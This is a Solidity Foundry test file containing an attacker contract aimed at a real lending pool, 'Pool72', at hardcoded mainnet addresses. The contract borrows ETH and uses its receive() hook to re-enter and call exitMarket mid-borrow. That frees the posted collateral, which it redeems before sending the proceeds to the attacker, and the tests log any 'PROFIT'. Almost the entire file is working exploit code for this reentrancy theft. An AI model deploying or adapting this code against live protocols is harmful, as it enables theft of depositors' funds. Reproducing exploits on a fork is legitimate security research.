// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function getCash() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function totalFuseFees() external view returns (uint256);
    function totalAdminFees() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
}

contract Pool72ReentrantAttacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;
    uint256 public exitCode;
    uint256 public reentryAction; // 0=exitMarket, 1=debug-only

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack(uint256 borrowAmt, uint256 _action) external payable {
        reentryAction = _action;

        FETH72.mint{value: msg.value}();
        console.log("cTokens minted:", FETH72.balanceOf(address(this)));

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        (uint256 e, uint256 liq, uint256 sf) = COMPTROLLER.getAccountLiquidity(address(this));
        console.log("Pre-borrow liquidity:", liq);

        borrowInFlight = true;
        uint256 result = FETH72.borrow(borrowAmt);
        borrowInFlight = false;
        console.log("Borrow result:", result);
        console.log("Reentered:", reentered);
        console.log("Exit code:", exitCode);

        if (reentered && exitCode == 0) {
            console.log("Exit worked! Redeeming...");
            uint256 cTokens = FETH72.balanceOf(address(this));
            console.log("cTokens to redeem:", cTokens);
            if (cTokens > 0) {
                uint256 rr = FETH72.redeem(cTokens);
                console.log("Redeem result:", rr);
            }
        }

        console.log("Final contract balance:", address(this).balance);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;

        console.log("=== REENTRANT ===");
        console.log("ETH received:", msg.value);

        uint256 cash = FETH72.getCash();
        uint256 tBorrows = FETH72.totalBorrows();
        uint256 tReserves = FETH72.totalReserves();
        uint256 tSupply = FETH72.totalSupply();

        console.log("During reentry - Cash:", cash);
        console.log("During reentry - TotalBorrows:", tBorrows);
        console.log("During reentry - TotalReserves:", tReserves);
        console.log("During reentry - TotalSupply:", tSupply);

        if (cash + tBorrows >= tReserves) {
            uint256 num = cash + tBorrows - tReserves;
            console.log("Numerator (safe):", num);
        } else {
            console.log("NUMERATOR WOULD UNDERFLOW!");
        }

        if (reentryAction == 0) {
            exitCode = COMPTROLLER.exitMarket(address(FETH72));
            console.log("exitMarket result:", exitCode);
        }
    }
}

contract Pool72Test4 is Test {
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    function testBorrow1ETH() public {
        address payable attacker = payable(address(0xBEEF));
        vm.deal(attacker, 500 ether);

        vm.startPrank(attacker);
        Pool72ReentrantAttacker a = new Pool72ReentrantAttacker(attacker);

        // Borrow 1 ETH with 10 ETH collateral
        // action=1 means debug-only (don't try exitMarket)
        uint256 balBefore = attacker.balance;
        a.attack{value: 10 ether}(1 ether, 1);
        uint256 balAfter = attacker.balance;
        console.log("Bal before:", balBefore);
        console.log("Bal after:", balAfter);
        vm.stopPrank();
    }

    function testBorrow1ETHWithExit() public {
        address payable attacker = payable(address(0xBEEF));
        vm.deal(attacker, 500 ether);

        vm.startPrank(attacker);
        Pool72ReentrantAttacker a = new Pool72ReentrantAttacker(attacker);

        // Borrow 1 ETH with 10 ETH collateral, try exitMarket during reentrancy
        uint256 balBefore = attacker.balance;
        a.attack{value: 10 ether}(1 ether, 0);
        uint256 balAfter = attacker.balance;
        console.log("Bal before:", balBefore);
        console.log("Bal after:", balAfter);
        if (balAfter > balBefore) console.log("PROFIT:", balAfter - balBefore);
        vm.stopPrank();
    }
}
